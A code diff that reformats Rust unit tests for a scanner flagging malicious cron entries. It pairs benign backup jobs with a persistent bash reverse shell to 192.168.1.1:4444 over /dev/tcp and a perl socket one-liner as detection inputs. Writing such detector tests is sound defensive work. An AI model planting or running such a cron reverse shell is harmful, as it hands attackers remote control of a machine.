@@ -535,7 +535,9 @@ mod tests {
     fn clean_backup_script_is_not_flagged() {
         // Ensure a realistic legitimate entry produces no findings.
         assert!(matched_patterns("0 3 * * * root /usr/local/bin/backup.sh").is_empty());
-        assert!(matched_patterns("*/15 * * * * www-data /usr/bin/php /var/www/cron.php").is_empty());
+        assert!(
+            matched_patterns("*/15 * * * * www-data /usr/bin/php /var/www/cron.php").is_empty()
+        );
     }
 
     #[test]
@@ -546,17 +548,13 @@ mod tests {
 
     #[test]
     fn reverse_shell_via_bash_tcp_is_flagged() {
-        let r = matched_patterns(
-            "* * * * * bash -i >& /dev/tcp/192.168.1.1/4444 0>&1",
-        );
+        let r = matched_patterns("* * * * * bash -i >& /dev/tcp/192.168.1.1/4444 0>&1");
         assert!(!r.is_empty());
     }
 
     #[test]
     fn perl_reverse_shell_is_flagged() {
-        let r = matched_patterns(
-            "* * * * * perl -e 'use Socket; ...'",
-        );
+        let r = matched_patterns("* * * * * perl -e 'use Socket; ...'");
         assert!(!r.is_empty());
         assert!(r.iter().any(|s| s.contains("inline interpreter")));
     }
